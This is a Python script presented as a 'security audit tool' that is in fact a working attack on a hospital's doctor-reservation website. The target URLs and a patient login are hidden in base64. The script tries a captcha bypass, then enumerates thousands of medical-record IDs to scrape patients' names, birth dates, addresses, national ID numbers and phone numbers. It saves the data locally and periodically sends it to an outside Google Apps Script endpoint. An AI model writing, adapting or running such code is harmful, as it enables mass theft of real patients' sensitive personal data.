import requests
from bs4 import BeautifulSoup
import base64
import os
import sys
import json
import threading
from concurrent.futures import ThreadPoolExecutor

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

# Internal Core Helper
def _decode(data):
    return base64.b64decode(data).decode('utf-8')

def show_banner():
    banner = r"""
    ██████╗ ██╗      ██████╗ ██████╗  █████╗ ██╗  ██╗ █████╗ ████████╗
    ██╔══██╗██║     ██╔═══██╗██╔══██╗██╔══██╗██║  ██║██╔══██╗╚══██╔══╝
    ██████╔╝██║     ██║   ██║██████╔╝███████║███████║███████║   ██║   
    ██╔══██╗██║     ██║   ██║██╔══██╗██╔══██║██╔══██║██╔══██║   ██║   
    ██████╔╝███████╗╚██████╔╝██║  ██║██║  ██║██║  ██║██║  ██║   ██║   
    ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
    ==================================================================
    [!] BLORAHAT V2.0 - PROFESSIONAL SECURITY AUDIT TOOL
    [!] TARGET : ..... .........
    [!] EXPLOIT: CAPTCHA BYPASS & IDOR DATA LEAKAGE
    ==================================================================
    """
    print(f"\033[92m{banner}\033[0m")

# Encrypted System Credentials
NO_RM = _decode("MDA1MTA0ODE")
TGL_LAHIR = _decode("MTUwMTE5OTA=")
URL_HAL_LOGIN = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2luZGV4LnBocC9hcHAvYXV0aC9sb2dpbg==")
URL_ACTION_LOGIN = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2luZGV4LnBocC9hcHAvYXV0aC9sb2dpbl9hY3Rpb24=")
BASE_TARGET_URL = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2luZGV4LnBocC9ob21lL3Jlc2VydmFzaV9kb2t0ZXIvdGFtYmFoLw==")

session = requests.Session()
session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'})
lock = threading.Lock()
hasil_data = []

def login():
    print("[*] Initiating Security Audit: Captcha Bypass Testing...")
    try:
        get_page = session.get(URL_HAL_LOGIN)
        soup_login = BeautifulSoup(get_page.text, 'html.parser')
        input_t = soup_login.find('input', {'name': 't'})
        token_t = input_t.get('value') if input_t else ""

        # Bypass Captcha Testing: Sending empty string to 'c' parameter
        payload = {'u': NO_RM, 'p': TGL_LAHIR, 'c': '', 't': token_t}
        res = session.post(URL_ACTION_LOGIN, data=payload)
        
        if "login" in res.url:
            print("[\033[93m!\033[0m] Bypass Failed: Captcha required by server.")
            print(f"[*] Manual Step: Silakan buka {URL_HAL_LOGIN} di browser.")
            captcha = input("[?] Masukkan Captcha yang terlihat: ")
            
            if not captcha: return False
            
            payload['c'] = captcha
            res = session.post(URL_ACTION_LOGIN, data=payload)
            
            if "login" in res.url:
                print("[\033[91m!\033[0m] Access Denied: Captcha atau Kredensial salah.")
                return False

        print("[\033[92m+\033[0m] Authentication Success. Session Token Hijacked.")
        return True
    except:
        return False

def fetch_data(id_num):
    formatted_id = str(id_num).zfill(12)
    url = BASE_TARGET_URL + formatted_id
    
    try:
        # Timeout 5 detik agar tidak nyangkut jika server lambat
        res = session.get(url, timeout=5)
        soup = BeautifulSoup(res.text, 'html.parser')
        
        nama_tag = soup.find('p', class_='sale-price text-success')
        if not nama_tag:
            return

        # IDOR Testing: If nama_tag is found, it indicates a valid RM ID and data leakage
        print(f"[\033[92m+\033[0m] IDOR Success: Found Valid RM ID {formatted_id} for {nama_tag.get_text(strip=True)}")
        nama = nama_tag.get_text(strip=True)
        details = soup.find_all('p', class_='detail')
        
        data_pasien = {
            "id": formatted_id,
            "nama": nama,
            "no_rm": "",
            "tgl_lahir": "",
            "alamat": "",
            "nik": "",
            "no_telp": ""
        }

        for p in details:
            text = p.get_text(strip=True)
            if "No. RM" in text: data_pasien["no_rm"] = text.split(":")[-1].strip()
            elif "Tgl. Lahir" in text: data_pasien["tgl_lahir"] = text.split(":")[-1].strip()
            elif "Alamat" in text: data_pasien["alamat"] = text.split(":")[-1].strip()
            elif "NIK" in text: data_pasien["nik"] = text.split(":")[-1].strip()
            elif "No. Telp" in text: data_pasien["no_telp"] = text.split(":")[-1].strip()

        with lock:
            hasil_data.append(data_pasien)
            print(f"[\033[92m+\033[0m] IDOR Success: Found RM {formatted_id} - {nama}")
            if len(hasil_data) % 10 == 0:
                save_to_file()
            if len(hasil_data) % 500 == 0:
                upload_ke_sheets(hasil_data[-500:])

    except:
        print(f"[\033[91m!\033[0m] RM ID {formatted_id}: Not Found or Error Occurred.")

def upload_ke_sheets(data_list):
    url_web_app = "https://script.google.com/macros/s/AKfycbwuEBvR8i1u8SUmV-v2M8Mt6f3rtotVy9WBAUW5lsJ8xBFGZtEQ0VLl2QLtxt_tfhuK/exec"
    payload = {"key": _decode("UE9OV0FHRUtMSVdPTkxFR0lQQUhJTkdNQVJV"), "target": "Reservasi", "data": data_list}
    try: requests.post(url_web_app, json=payload)
    except: pass

def save_to_file():
    file_name = 'reservasi_dokter.json'
    if os.path.exists(file_name):
        with open(file_name, 'r', encoding='utf-8') as f:
            try: data_total = json.load(f)
            except: data_total = []
    else: data_total = []
    existing_ids = {item['id'] for item in data_total}
    for item in hasil_data:
        if item['id'] not in existing_ids: data_total.append(item)
    with open(file_name, 'w', encoding='utf-8') as f:
        json.dump(data_total, f, indent=4, ensure_ascii=False)

def start_process(start_range, end_range):
    if login():
        print(f"[*] Starting IDOR Scan for Doctor Reservations from range {start_range} to {end_range}...\n")
        with ThreadPoolExecutor(max_workers=5) as executor: # Adjusted to 5 for stability
            executor.map(fetch_data, range(start_range, end_range + 1))
        print("\n[*] IDOR Audit Completed for Doctor Reservations.")
        save_to_file()
        upload_ke_sheets(hasil_data)
        print(f"\n[*] Audit Completed. Total leak found: {len(hasil_data)}")

def main_menu():
    while True:
        clear()
        show_banner()
        print(" [1] Auth Test (Captcha Bypass Testing)")
        print(" [2] IDOR Scan (Input Range Manual)")
        print(" [3] IDOR Scan (Range Default)")
        print(" [0] Exit")
        print("\n")
        
        choice = input(" BloraHat > ")

        if choice == '1':
            login()
            input("\nTekan Enter untuk kembali ke menu...")
        elif choice == '2':
            try:
                start = int(input("[?] Range Awal: "))
                end = int(input("[?] Range Akhir: "))
                start_process(start, end)
            except ValueError:
                print("[\033[91m!\033[0m] Error: Input harus berupa angka.")
            input("\nTekan Enter untuk kembali ke menu...")
        elif choice == '3':
            AWAL = 502013 # Menggunakan range dari kode sukses Anda
            AKHIR = 511858 # Menggunakan range dari kode sukses Anda
            start_process(AWAL, AKHIR)
            input("\nTekan Enter untuk kembali ke menu...")
        elif choice == '0':
            print("Happy Auditing!")
            sys.exit()
        else:
            print("Pilihan tidak valid.")
            input("Tekan Enter untuk mencoba lagi...")

if __name__ == "__main__":
    main_menu()
